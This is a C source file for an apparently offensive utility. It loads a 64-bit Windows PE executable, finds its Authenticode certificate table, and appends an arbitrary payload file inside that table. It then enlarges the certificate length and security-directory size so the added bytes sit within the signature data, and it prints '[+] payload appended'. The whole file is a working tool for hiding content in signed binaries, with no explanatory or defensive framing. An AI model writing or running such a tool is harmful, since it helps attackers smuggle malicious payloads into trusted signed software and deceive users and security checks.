#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#pragma pack(push,1)

typedef struct {
    uint16_t e_magic;
    uint8_t  pad[58];
    uint32_t e_lfanew;
} IMAGE_DOS_HEADER;

typedef struct {
    uint32_t VirtualAddress;
    uint32_t Size;
} IMAGE_DATA_DIRECTORY;

typedef struct {
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
} IMAGE_FILE_HEADER;

typedef struct {
    uint16_t Magic;
    uint8_t  pad1[110];
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64;

typedef struct {
    uint32_t Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64;

typedef struct {
    uint32_t dwLength;
    uint16_t wRevision;
    uint16_t wCertificateType;
    uint8_t  bCertificate[1];
} WIN_CERTIFICATE;

#pragma pack(pop)

#define IMAGE_DIRECTORY_ENTRY_SECURITY 4

static uint32_t align8(uint32_t v)
{
    return (v + 7) & ~7;
}

int main(int argc, char **argv)
{
    const char *in  = argv[1];
    const char *pl  = argv[2];
    const char *out = argv[3];

    FILE *f = fopen(in, "rb");
    if (!f) return 1;

    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);

    uint8_t *file = malloc(fsize);
    fread(file, 1, fsize, f);
    fclose(f);

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)file;
    if (dos->e_magic != 0x5A4D) {
        printf("not a PE\n");
        return 1;
    }

    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(file + dos->e_lfanew);

    IMAGE_DATA_DIRECTORY *sec = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];

    if (sec->VirtualAddress == 0 || sec->Size == 0) {
        printf("no security directory\n");
        return 1;
    }

    uint32_t cert_offset = sec->VirtualAddress;

    WIN_CERTIFICATE *cert = (WIN_CERTIFICATE *)(file + cert_offset);

    FILE *pf = fopen(pl, "rb");
    if (!pf) return 1;

    fseek(pf, 0, SEEK_END);
    long psize = ftell(pf);
    fseek(pf, 0, SEEK_SET);

    uint8_t *payload = malloc(psize);
    fread(payload, 1, psize, pf);
    fclose(pf);

    uint32_t old_len = cert->dwLength;
    printf("[+] old length: %lu\n", old_len);
    uint32_t add_len = align8(psize);

    uint32_t new_cert_len = old_len + add_len;
    uint32_t new_file_size = fsize + add_len;

    printf("[+] new length: %lu\n", new_cert_len);

    uint8_t *newfile = calloc(1, new_file_size);

    memcpy(newfile, file, fsize);

    uint32_t insert_off = cert_offset + old_len;

    memcpy(newfile + insert_off, payload, psize);

    WIN_CERTIFICATE *newcert = (WIN_CERTIFICATE *)(newfile + cert_offset);

    newcert->dwLength = new_cert_len;

    IMAGE_NT_HEADERS64 *newnt = (IMAGE_NT_HEADERS64 *)(newfile + dos->e_lfanew);

    newnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size += add_len;

    FILE *outf = fopen(out, "wb");
    fwrite(newfile, 1, new_file_size, outf);
    fclose(outf);

    printf("[+] payload appended\n");

    free(file);
    free(payload);
    free(newfile);

    return 0;
}
